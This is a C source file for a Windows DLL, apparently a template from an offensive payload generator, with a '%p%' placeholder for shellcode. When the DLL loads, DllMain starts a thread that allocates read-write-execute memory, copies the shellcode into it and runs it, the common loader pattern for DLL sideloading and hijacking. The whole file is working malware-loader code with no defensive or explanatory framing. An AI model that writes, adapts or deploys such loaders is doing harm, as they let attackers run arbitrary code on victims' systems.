#include <windows.h>

unsigned char payload[] = %p%;
unsigned int payload_len = sizeof(payload);

DWORD WINAPI run() {
    LPVOID memory;  // memory buffer for payload
    HANDLE pHandle; // process handle

    // get the current process handle
    pHandle = GetCurrentProcess();

    // allocate memory and set the read, write, and execute flag
    memory = VirtualAllocEx(pHandle, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // copy the shellcode into the newly allocated memory
    WriteProcessMemory(pHandle, memory, (LPCVOID)payload, payload_len, NULL);

    // if everything went well, we should now be able to execute the shellcode
    ((void(*)())memory)();

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    HANDLE threadhandle;
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // create a thread and run our function
            threadhandle = CreateThread(NULL, 0, run, NULL, 0, NULL);
            // close the thread handle
            CloseHandle(threadhandle);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
